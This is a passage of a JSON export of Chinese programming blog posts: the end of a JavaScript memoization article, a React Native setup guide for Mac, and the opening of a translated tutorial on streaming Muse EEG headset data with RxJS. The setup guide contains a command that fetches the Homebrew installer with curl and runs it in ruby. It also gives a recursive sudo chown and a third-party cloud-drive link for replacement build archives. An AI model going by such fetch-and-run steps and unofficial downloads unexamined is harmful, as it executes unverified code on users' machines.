fib(\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e) 时，相当于 fib(\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) + fib(\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e) 加上 fib(\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e) 本身这一次，共 \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e = \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e 次\n\n当执行 fib(\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e) 时，相当于 fib(\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e) + fib(\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) 加上 fib(\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e) 本身这一次，共 \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e = \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e 次\n\n当执行 fib(\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e) 时，相当于 fib(\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e) + fib(\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e) 加上 fib(\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e) 本身这一次，共 \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e = \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e 次\n\n当执行 fib(\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e) 时，相当于 fib(\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e) + fib(\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e) 加上 fib(\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e) 本身这一次，共 \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e = \u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e 次\n\n当执行 fib(\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e) 时，相当于 fib(\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e) + fib(\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e) 加上 fib(\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e) 本身这一次，共 \u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e = \u003cspan class=\"hljs-number\"\u003e67\u003c/span\u003e 次\n\n当执行 fib(\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e) 时，相当于 fib(\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e) + fib(\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e) 加上 fib(\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e) 本身这一次，共 \u003cspan class=\"hljs-number\"\u003e67\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e = \u003cspan class=\"hljs-number\"\u003e109\u003c/span\u003e 次\n\n当执行 fib(\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e) 时，相当于 fib(\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e) + fib(\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e) 加上 fib(\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e) 本身这一次，共 \u003cspan class=\"hljs-number\"\u003e109\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e67\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e = \u003cspan class=\"hljs-number\"\u003e177\u003c/span\u003e 次\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e所以执行的总次数为：177 + 109 + 67 + 41 + 25 + 15 + 9 + 5 + 3 + 1 + 1 = 453 次！\u003c/p\u003e\n\u003cp\u003e如果我们使用函数记忆呢？\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e count = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e fibonacci = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003en\u003c/span\u003e) \u003c/span\u003e{\n    count++;\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e n \u0026lt; \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e ? n : fibonacci(n - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) + fibonacci(n - \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e);\n};\n\nfibonacci = memorize(fibonacci)\n\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i \u0026lt;= \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e; i++) {\n    fibonacci(i)\n}\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(count) \u003cspan class=\"hljs-comment\"\u003e// 12\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们会发现最后的总次数为 12 次，因为使用了函数记忆，调用次数从 453 次降低为了 12 次!\u003c/p\u003e\n\u003cp\u003e兴奋的同时不要忘记思考：为什么会是 12 次呢？\u003c/p\u003e\n\u003cp\u003e从 0 到 10 的结果各储存一遍，应该是 11 次呐？咦，那多出来的一次是从哪里来的？\u003c/p\u003e\n\u003cp\u003e所以我们还需要认真看下我们的写法，在我们的写法中，其实我们用生成的 fibonacci 函数覆盖了原本了 fibonacci 函数，当我们执行 fibonacci(0) 时，执行一次函数，cache 为 {0: 0}，但是当我们执行 fibonacci(2) 的时候，执行 fibonacci(1) + fibonacci(0)，因为 fibonacci(0) 的值为 0，\u003ccode\u003e!cache[address]\u003c/code\u003e 的结果为 true，又会执行一次 fibonacci 函数。原来，多出来的那一次是在这里！\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e多说一句\u003c/h2\u003e\n\u003cp\u003e也许你会觉得在日常开发中又用不到 fibonacci，这个例子感觉实用价值不高呐，其实，这个例子是用来表明一种使用的场景，也就是如果需要大量重复的计算，或者大量计算又依赖于之前的结果，便可以考虑使用函数记忆。而这种场景，当你遇到的时候，你就会知道的。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e专题系列\u003c/h2\u003e\n\u003cp\u003eJavaScript专题系列目录地址：\u003ca href=\"https://github.com/mqyqingfeng/Blog\" target=\"_blank\"\u003ehttps://github.com/mqyqingfeng/Blog\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003eJavaScript专题系列预计写二十篇左右，主要研究日常开发中一些功能点的实现，比如防抖、节流、去重、类型判断、拷贝、最值、扁平、柯里、递归、乱序、排序等，特点是研(chao)究(xi) underscore 和 jQuery 的实现方式。\u003c/p\u003e\n\u003cp\u003e如果有错误或者不严谨的地方，请务必给予指正，十分感谢。如果喜欢或者有所启发，欢迎 star，对作者也是一种鼓励。\u003c/p\u003e\n","buildTime":"1515056159.7398","__v":0}
{"_id":{"$oid":"5a4e188de4919b0e782b4c77"},"id":"59b50123f265da066f6a79de","author":{"$oid":"5a4b76d92239bd131cd79f26"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/9/10/7807b70507c886ea8a29eb2d960b303c","https://user-gold-cdn.xitu.io/2017/9/10/addf4e9df76f88cd4b8963281bf82355"],"screenShot":null}],"title":"React Native开发环境搭建","meta":{"likeCount":0},"tag":["React.js","React Native","Node.js","前端"],"comment":[],"shortContent":"最近开始全面使用React技术栈开发，耳听得团队不久的将来有计划使用React Native开发app，迫不及待来尝试一波，首先搭建好开发环境并跑起来咱们程序界的经典程序，期间也有一些坑，在这里记录分享给大家。 安装包管理工具 本人使用的是Mac环境，所以以Mac为例，对于win…","content":"\u003cp\u003e最近开始全面使用React技术栈开发，耳听得团队不久的将来有计划使用React Native开发app，迫不及待来尝试一波，首先搭建好开发环境并跑起来咱们程序界的经典程序，期间也有一些坑，在这里记录分享给大家。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e安装包管理工具\u003c/h2\u003e\n\u003cp\u003e本人使用的是Mac环境，所以以Mac为例，对于windows，其实差别不大。\u003c/p\u003e\n\u003ch3 id=\"-homebrew\"\u003e安装Homebrew\u003c/h3\u003e\n\u003cp\u003eHomebrew是为Mac OS量身定制的一款集成包管理工具，我们使用它很方便的安装Node.js及切换Node.js版本。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e/usr/bin/ruby \u003cspan class=\"hljs-_\"\u003e-e\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\u003c/span\u003e\"\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e注：在Max OS X 10.x版本中使用Homebrew安装软件时可能会发生\u003ccode\u003e/usr/local\u003c/code\u003e目录不可写的权限问题，此时可以使用如下命令修复：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003esudo chown -R `whoami` /usr/\u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"-node-js\"\u003e安装Node.js\u003c/h3\u003e\n\u003cp\u003e接下来使用Homebrew安装Node.js，Windows环境可以直接去官网下载安装\u003ca href=\"https://nodejs.org/zh-cn/download/\" target=\"_blank\"\u003eNode.js\u003c/a\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003ebrew install node\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果安装下载速度过慢，可以设置使用国内淘宝提供的镜像：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003enpm config \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e registry https://registry.npm.taobao.org --global\nnpm config \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e disturl https://npm.taobao.org/dist --global\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"-\"\u003e安装包管理\u003c/h3\u003e\n\u003cp\u003e我们可以自由选择直接使用NPM或者另外安装Yarn包管理工具，对于NPM的使用相信大家都已经很熟悉了，我们这里以Yarn为例：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"http://yarnpkg.com/\" target=\"_blank\"\u003eYarn\u003c/a\u003e是Facebook提供的替代npm的工具，可以加速node模块的下载。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e依然需要使用NPM安装Yarn包：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003enpm install -g yarn\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e随后我们就可以使用\u003ccode\u003eyarn add\u003c/code\u003e代替\u003ccode\u003enpm install --save\u003c/code\u003e了。\u003c/p\u003e\n\u003ch2 id=\"-react-native-cli-\"\u003e安装react-native-cli脚手架\u003c/h2\u003e\n\u003cp\u003eReact Native官方提供了一键生成项目初始结构的脚手架，初学者或体验者可以直接安装使用：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003enpm install -g react-native-cli\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"-\"\u003e安装设置编辑器\u003c/h2\u003e\n\u003cp\u003eMac我们使用Xcode开发iOS APP，安卓开发可以使用Eclipse等，另外需要对Xcode编辑器进行简单配置以支持react native：\u003c/p\u003e\n\u003cp\u003e依次点击打开Xcode编辑器的Menu-》Preferences-》Locations，配置如下图红框中的命令行工具项：\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/10/7807b70507c886ea8a29eb2d960b303c\" alt=\"Xcode命令行工具配置\"/\u003e\u003cfigcaption\u003eXcode命令行工具配置\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e初始化项目及解决运行异常\u003c/h2\u003e\n\u003cp\u003e接下来可以使用脚手架初始化一个示例程序了：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e// 初始化一个hello项目\nreact-native init hello\n\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e hello\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e进入项目根目录后，使用\u003ccode\u003erun-ios\u003c/code\u003e指令启动该iOS APP：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003ereact-native run-ios\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对于版本高于0.45的创建项目，也许你会看到如下错误：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003eError:\n\nBuild failed:\nUnpacking /Users/zjy/.rncache/boost_1_63_0.tar.gz...\n\nPrint: Entry, \u003cspan class=\"hljs-string\"\u003e\":CFBundleIdentifier\"\u003c/span\u003e, Does Not Exist\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"-\"\u003e降级版本方案\u003c/h3\u003e\n\u003cp\u003e本人经过多方查找，发现是创建项目下载安装node依赖模块时的资源缺失问题，目前最新的0.45及以上版本需要下载boost库，该库过大，导致下载出问题，参考:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/facebook/react-native/issues/14368\" target=\"_blank\"\u003ehttps://github.com/facebook/react-native/issues/14368\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/facebook/react-native/issues/14447\" target=\"_blank\"\u003ehttps://github.com/facebook/react-native/issues/14447\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e解决方案有两种，如果不追求新版本新特性，可以降低创建项目的版本，使用\u003ccode\u003e--version\u003c/code\u003e指令明确设置项目版本：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003ereact-native init MyApp --version 0.44.3\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"-\"\u003e替换资源文件方案\u003c/h3\u003e\n\u003cp\u003e依然希望使用新版本的解决方案则是手动下载相关文件替换：\u003c/p\u003e\n\u003cp\u003e下载如下四个相关文件放到项目根目录下的\u003ccode\u003e.rncache\u003c/code\u003e目录下，进行替换：\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/10/addf4e9df76f88cd4b8963281bf82355\" alt=\"rncache文件\"/\u003e\u003cfigcaption\u003erncache文件\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e下载地址：\u003ca href=\"https://pan.baidu.com/s/1kV5iVzD\" target=\"_blank\"\u003ehttps://pan.baidu.com/s/1kV5iVzD.\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e下载后替换：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e ~/.rncache\ncp ~/Downloads/boost_1_63_0.tar.gz ~/.rncache/\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e依次使用\u003ccode\u003ecp\u003c/code\u003e指令复制替换四个文件；\u003c/p\u003e\n\u003cp\u003e然后删除第三方库文件，在\u003ccode\u003enode_modules/react-native/third-party/\u003c/code\u003e目录下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003erm -r project/node_modules/react-native/third-part\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e再次执行启动程序：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003ereact-native run-ios\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e发现可以正常运行了，接下来我们可以在编辑器里编辑我们的项目了，如我们的react-native入口js文件--\u003ccode\u003eindex.ios.js\u003c/code\u003e文件，刷新即可看到变更。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e其他工具\u003c/h2\u003e\n\u003ch3 id=\"nuclide\"\u003eNuclide\u003c/h3\u003e\n\u003cp\u003eNuclide是由Facebook提供的一款基于atom编辑器的集成开发环境，可用于编写、\u003ca href=\"http://nuclide.io/docs/platforms/react-native/#running-applications\" target=\"_blank\"\u003e运行\u003c/a\u003e和 \u003ca href=\"http://nuclide.io/docs/platforms/react-native/#debugging\" target=\"_blank\"\u003e调试\u003c/a\u003eReact Native应用。\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"http://nuclide.io/docs/quick-start/getting-started/\" target=\"_blank\"\u003eNuclide的入门文档\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e原创文章，欢迎访问我的博客：\u003ca href=\"http://blog.codingplayboy.com/2017/09/10/react-native-init/\" target=\"_blank\"\u003e熊建刚的博客\u003c/a\u003e。\u003c/p\u003e\n","buildTime":"1515057181.3748","__v":0}
{"_id":{"$oid":"5a4e188de4919b0e782b4c7b"},"id":"59f14257f265da431f4a497b","author":{"$oid":"5a4e188de4919b0e782b4c6c"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"[译] 响应式脑电波—如何使用 RxJS、Angular、Web 蓝牙以及脑电波头戴设备来让我们的大脑做一些更酷的事","meta":{"likeCount":0},"tag":["蓝牙","RxJS","Angular.js","React.js"],"comment":[],"shortContent":"几个月前，我偶然间发现了一台蓝牙智能脑电波头戴设备。我突然意识到它的巨大潜力，使用它可以做一些超级酷的事情：使用 Web 蓝牙，可以直接用大脑与网页进行通讯！ 脑电波 ( Electroencephalography，简称 EEG ) 本质上是监控脑电活动的一种方式。它通常需要…","content":"\u003cblockquote\u003e\n\u003cp\u003e原文链接: \u003ca href=\"https://medium.com/@urish/reactive-brain-waves-af07864bb7d4\"\u003ehttps://medium.com/@urish/reactive-brain-waves-af07864bb7d4\u003c/a\u003e\u003cbr\u003e本文为 \u003ca href=\"https://github.com/RxJS-CN\"\u003eRxJS 中文社区\u003c/a\u003e 翻译文章，如需转载，请注明出处，谢谢合作！\u003cbr\u003e如果你也想和我们一起，翻译更多优质的 RxJS 文章以奉献给大家，请点击\u003ca href=\"https://github.com/RxJS-CN/rxjs-articles-translation\"\u003e【这里】\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e几个月前，我偶然间发现了一台蓝牙智能脑电波头戴设备。我突然意识到它的巨大潜力，使用它可以做一些超级酷的事情：使用 Web 蓝牙，可以直接用大脑与网页进行通讯！\u003c/p\u003e\n\u003cp\u003e脑电波 ( Electroencephalography，简称 EEG ) 本质上是监控脑电活动的一种方式。它通常需要在头皮上放置几个电极，然后收集关于神经元发射的信息，最后将信息记录在图表上。听起来像是一些想当不错的数据可供我使用！虽然脑电波主要用于医疗用途，但仍会不时出现一些新颖的使用案例。\u003c/p\u003e\n\u003cp\u003e其中一个新颖的使用案例便是 \u003ca href=\"http://www.choosemuse.com/\"\u003eMuse\u003c/a\u003e，它是一种消费产品，花费$250便可以帮助你学习如何进行冥想，同时它还是自带蓝牙、消耗脑电波的实体设备。虽然它能够教会你如何平静下来，但对我来说，只有弄清楚如何在网页上消费这些数据后，我才能平静下来！\u003c/p\u003e\n\u003cp\u003e\u003cem\u003e(如果你也无法保持平静的话，可选择略过此部分，直接查看下面的代码教程 ;-)\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e头戴设备配备 Android 或 IOS 应用，甚至还提供了一个库，这样你就可以获取原始数据并构建自己的应用，但这个库只能在原生应用中运行，而且源码不是开源的 (因此，我想用大脑控制网页的梦想起初看来是视乎是无法达成的的)。\u003c/p\u003e\n\u003cp\u003e在参加 ng-cruise 时，我遇到了 \u003ca href=\"https://medium.com/@castillo.io\"\u003eAlex Castillo\u003c/a\u003e，他的演讲展示了如何将他叫做 OpenBCI 的开源硬件脑电波头戴设备与 Angular 进行连接并将信号可视化。尽管这一切令人印象深刻，但他不得不使用 node.js 进行复杂的设置和 Web socket 服务器来传播数据，这离我想要的还有一定差距。后来在 ng-cruise 的黑客之夜，每个人都在尝试使用各种硬件设备来做一些很酷的东西，这些设备中就包括脑电图设备，所以我自然不会错过如此良机。\u003c/p\u003e\n\u003cp\u003e我尝试对 Muse 的蓝牙协议进行逆向工程，类似于\u003ca href=\"https://medium.com/@urish/reverse-engineering-a-bluetooth-lightbulb-56580fcb7546\"\u003e这篇文章\u003c/a\u003e所做的。大约进行了一个小时，我想到之前可能有人已经做到了，所以我 google 了我所发现的一个特征数字，并找到了这篇\u003ca href=\"https://medium.com/m/global-identity?redirectUrl=https://articles.jaredcamins.com/figuring-out-bluetooth-low-energy-8c2a2716e376\"\u003e超棒的文章\u003c/a\u003e，反过来这篇文章指出了由 \u003ca href=\"https://medium.com/@alexandre.barachant\"\u003eAlexandre Barachant\u003c/a\u003e 创建的 \u003ca href=\"https://github.com/alexandrebarachant/muse-lsl/blob/d2b74412585f3baa852516542a0d0853faec1b4e/muse/muse.py\"\u003epython 库\u003c/a\u003e，突然间，我拥有了我所需的一切：这就是 muse-js 诞生的过程。\u003c/p\u003e\n\u003cp\u003e所以现在我可以将 Web 和 Muse 头戴设备进行连接并接受脑电波数据 (还包括电池电量、加速计/陀螺仪，等等)。万岁！\u003c/p\u003e\n\u003cp\u003e那么接下来我要用它做什么呢？\u003c/p\u003e\n\u003ch2\u003e硬件\u003c/h2\u003e\n\u003cp\u003e在深入代码之前，我们首先来了解下 Muse 头戴设备。基本上，它就是一个轻量级的可充电头带。它配备了4个脑电波电极：2个在前额，眼睛稍微往上一些，另外2个与耳朵接触。此外，它还配备了螺旋仪和加速计，这样可以计算出头的方位。我很高兴我发现了它还有另外一个脑电波传感器，这样就可以连接到自己的电极了 (尽管是 Micro USB 接口)，我打算尽快进行尝试。\u003c/p\u003e\n\u003cp\u003e注意头带有两个版本：2014款和2016款。你想要的肯定是2016款，它使用了蓝牙低耗能。2014款使用的是经典蓝牙，因此无法与 Web 蓝牙一起使用。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/26/73cfb540a527e6bcbe24eb036ee46d73\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eMuse 2016: AF7 和 AF8 是前额电极, TP9 和 TP10 是耳电极\u003c/p\u003e\n\u003ch2\u003e使用 RxJS 的响应流\u003c/h2\u003e\n\u003cp\u003e构建库时，我需要决定如何暴露传入的脑电波数据。使用 Web 蓝牙，每当接收到新的数据包时都会触发一个事件。每个数据包包含来自单个电极的12个样本。我本可以让用户注册一个 JavaScript 函数，每当接收到新数据时便调用此函数，但我最后决定使用 RxJS 库 (JavaScript 的响应式扩展库)，它包括用于转换，组合和查询数据流的各种方法。\u003c/p\u003e\n\u003cp\u003eRxJS 的优势是它提供了一组函数，可让你操纵和处理从 Muse 头戴设备接收到的原始数据字节，以便将其转换为更有用的东西 (比如我们马上要做的)。\u003c/p\u003e\n\u003ch2\u003e可视化\u003c/h2\u003e\n\u003cp\u003e首先映入脑海的便是使用我们全新的 muse-js 可视化数据。黑客之夜当晚，Alex 和我开始开发 \u003ca href=\"https://github.com/urish/angular-muse\"\u003eangular-muse\u003c/a\u003e，这是一个 Angular 应用，它可以将脑电波数据和头部方向进行可视化。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/26/5ba2a74677f3a894f49f10f17028c3d7\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e我的 Muse 数据可视化初始原型\u003c/p\u003e\n\u003cp\u003e事实上，如果你拥有 Muse 设备和 \u003ca href=\"https://medium.com/@urish/is-now-a-good-time-to-start-using-web-bluetooth-hint-yes-yes-it-is-99e998d7b9f6\"\u003e支持 Web 蓝牙的浏览器\u003c/a\u003e，你便可以实际打开 \u003ca href=\"https://muse-eeg-app.firebaseapp.com/\"\u003eDemo 页面\u003c/a\u003e亲自尝试！\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/26/d610aa0f29fe5dfe92efe9c469f8f6e5\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e使用 Muse、 Angular 和 Smoothie Charts 将我的大脑活动进行可视化\u003c/p\u003e\n\u003cp\u003e这个应用以一种简单的方式证明了数据是流式传输，但老实说，查看数据图确实能够吸引人，但如果只是这样而已，那么你将很快失去对它的兴趣。\u003c/p\u003e\n\u003ch2\u003e关于眨眼\u003c/h2\u003e\n\u003cp\u003e脑电波所做的众多事情之一便是测量头皮上不同位置的电势 (电压)。测量的信号是大脑活动的副作用，可用于检测一般心理状态 (如浓度水平、突发刺激的检测，等等)。\u003c/p\u003e\n\u003cp\u003e除了大脑活动之外，还可以使用称为\u003ca href=\"https://en.wikipedia.org/wiki/Electrooculography\"\u003e眼球电图检查\u003c/a\u003e (幸运的是，我的女朋友就是验光师，她能够教我很多这方面的知识) 的技术来检测眼部运动。Muse 设备有两个电极位于前额 (在标准的 \u003ca href=\"https://en.wikipedia.org/wiki/10%E2%80%9320_system_%28EEG%29\"\u003e10-20定位系统\u003c/a\u003e中称为 AF7 和 AF8)，它们靠近双眼，所以我们能够轻而易举地监控眼部运动。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/26/8fdb3a6f70aab5d101fdf1d6f19175e9\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e我们的眼睛：角膜前方带正电，视网膜背部带负电\u003c/p\u003e\n\u003cp\u003e我们将使用这些电极的信号作为我们脑电图程序的 “Hello World”， 该程序会通过监测眼睛活动来检测眨眼。\u003c/p\u003e\n\u003ch2\u003e开始编码！\u003c/h2\u003e\n\u003cp\u003e我们的开发思路如下：我们从设备中获取传入的脑电波样本流 (如上所述，muse-js 将提供 RxJS Observable)，然后过滤出我们所需的 AF7 电极 (也就是左眼)，再然后我们会在信号中找寻峰值，例如，绝对值超过500mV的样本意味着发生了大变化。由于电极在眼睛旁边，我们期望眼球的运动产生显着的电势差。\u003c/p\u003e\n\u003cp\u003e虽然这可能不是检测眨眼最准确的方法，但它对我来说非常有用，并且代码简单易行 (就像所有优秀的 “Hello World” 示例那样 ;-) 。\u003c/p\u003e\n\u003cp\u003e但在开始之前，首先需要在项目中安装 \u003ccode\u003emuse-js\u003c/code\u003e...\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\"\u003enpm install --save muse-js\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e...然后在代码中进行导入。在这个示例中，它是一个 Angular 应用，其实只是用 Angular CLI 创建的空项目，但也可以使用 React/VueJS，随你喜欢，因为很少会有框架相关的代码。\u003c/p\u003e\n\u003cp\u003e接下来，我们将 \u003ccode\u003emuse-js\u003c/code\u003e 导入到应用的根组件中：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { MuseClient, channelNames } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e`muse-js`\u003c/span\u003e;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eMuseClient\u003c/code\u003e 类与头戴设备进行互动，\u003ccode\u003echannelNames\u003c/code\u003e 只是提供脑电图频道的映射，供开发者使用。\u003c/p\u003e\n\u003cp\u003e在组件中，我们会创建一个 \u003ccode\u003eMuseClient\u003c/code\u003e 的实例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.muse = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e MuseClient();\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e现在我们将进入略微有些棘手的部分：连接头戴设备的逻辑。\u003c/p\u003e\n\u003cp\u003eWeb 蓝牙需要一些用户交互，才能够启动连接，所以我们需要添加按钮，并只有当用户点击该按钮时才实际去连接头戴设备。我们在 \u003ccode\u003eonConnectButtonClick\u003c/code\u003e 方法来实现连接逻辑：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e onConnectButtonClick() {\n  \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.muse.connect();\n  \u003cspan 